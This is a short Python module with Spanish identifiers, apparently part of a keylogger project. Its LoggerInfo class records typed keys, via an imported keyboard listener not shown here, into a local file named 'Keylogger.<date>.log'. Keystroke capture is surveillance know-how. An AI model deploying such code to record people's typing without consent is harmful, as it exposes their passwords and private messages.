import logging
from datetime import datetime
from KeyBoarListener import KeyBoardListener


class LoggerInfo:
    def __init__(self, path='.'):
        self.__info = logging
        self.__listener = KeyBoardListener()
        self.__ruta = path
        self.__start_time = datetime.now()
        self.__end_time = None
        self._file_name = None

    @property
    def filename(self):
        return self._file_name

    @filename.setter
    def filename(self, value):
        self._file_name = value

    @property
    def ruta(self):
        return self.__ruta

    @ruta.setter
    def ruta(self, value):
        self.__ruta = value

    @property
    def info(self):
        return self.__info

    @property
    def listener(self):
        return self.__listener

    @property
    def start_time(self):
        return self.__start_time

    @start_time.setter
    def start_time(self, value):
        self.__start_time = value

    @property
    def end_time(self):
        return self.__end_time

    @end_time.setter
    def end_time(self, value):
        self.__end_time = value

    def init(self):
        self.start_time = datetime.now()
        self.info.info(f"Iniciando el log - {self.start_time}")

    def finish(self):
        self.end_time = datetime.now()
        self.info.info(f"Finalizando el log - {self.end_time}")

    def config(self):
        self.filename = f"Keylogger.{self.start_time.strftime('%Y-%m-%d')}.log"
        self.info.basicConfig(
            encoding='utf-8',
            level=self.info.INFO,
            filename=f'{self.ruta}/{self.filename}',
            filemode='w',
            format='%(asctime)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S'
        )


if __name__ == '__main__':
    lista = []

    def add_text(event):
        lista.append(event.name)
        print(lista)

    log = LoggerInfo(path='./Log')
    log.config()
    log.init()
    log.info.info(log.listener.obtener_elementos_tecleados(log.listener.leer_tecleado_antes_de('tab')))
    log.info.info(f'{log.listener.ejecutar_funcion_callback(add_text)}')
    log.finish()
    print(log.__dict__)
    print(log.info)
